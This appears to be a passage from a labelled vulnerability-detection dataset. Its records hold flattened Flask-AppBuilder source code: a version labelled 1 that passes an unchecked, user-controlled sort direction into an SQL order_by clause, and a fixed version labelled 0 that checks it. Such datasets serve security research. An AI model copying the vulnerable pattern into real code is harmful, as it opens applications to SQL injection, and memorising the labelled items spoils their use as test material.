list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n/n/n/n/flask_appbuilder/urltools.py/n/nimport re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))\n    return orders\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n/n/n/n", "label": 1}, {"id": "2158db051408e0d66210a99b17c121be008e20b6", "code": "flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(\"%s %s\" % (order_column, order_direction))\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n/n/n/nflask_appbuilder/urltools.py/n/nimport re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            order_direction = request.args.get('_od_' + re_match[0])\n            if order_direction in ('asc', 'desc'):\n                orders[re_match[0]] = (request.args.get(arg), order_direction)\n    return orders\n\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n/n/n/n", "label": 0}, {"id": "2158db051408e0d66210a99b17c121be008e20b6", "code": "/flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(order_column + ' ' + order_direction)\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def 